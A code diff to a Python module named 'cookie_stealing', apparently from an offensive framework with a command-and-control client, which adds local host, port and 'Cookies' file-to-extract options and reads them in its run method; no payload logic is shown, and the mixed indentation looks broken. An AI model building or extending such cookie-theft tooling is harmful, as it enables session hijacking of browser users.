@@ -12,11 +12,23 @@ class cookie_stealing(Module):
 	#MODULE OPTIONS
 	config  = Config({
         Option(
-            'OPT', 												#option
-            "Description", 										#description
+            'LHOST', 												#option
+            "Direccion IP local.", 										#description
             True,												#Required = True, Optional = False
             #set_callback=lambda o: o.root._set_app_folder(), 	#execute a function if required
-        ): "default", 											#Default value
+        ): "0.0.0.0", 											#Default value
+        Option(
+            'LPORT',                        #option
+            "Puerto local.",                    #description
+            True,                       #Required = True, Optional = False
+            #set_callback=lambda o: o.root._set_app_folder(),   #execute a function if required
+        ): "445",
+        Option(
+            'DST_FILE',                        #option
+            "Nombre del archivo a extraer.",                    #description
+            True,                       #Required = True, Optional = False
+            #set_callback=lambda o: o.root._set_app_folder(),   #execute a function if required
+        ): "Cookies",
     })
 
 	def run(self):
@@ -24,7 +36,9 @@ class cookie_stealing(Module):
 		parent_path = "Prueba/sourcecodes/"
 		parent_webroot_path = "Prueba/webroot/"
 
-		c2client = ''.join(list(self.config.get('OPT'))) #Assign option value to variable
+		lhost = ''.join(list(self.config.get('LHOST'))) #Assign option value to variable
+    lport = ''.join(list(self.config.get('LPORT'))) #Assign option value to variable
+    nombre_archivo_cookies = ''.join(list(self.config.get('DST_FILE'))) #Assign option value to variable
 
 		#ARGUMENTOS DEL CODIGO CPP
 
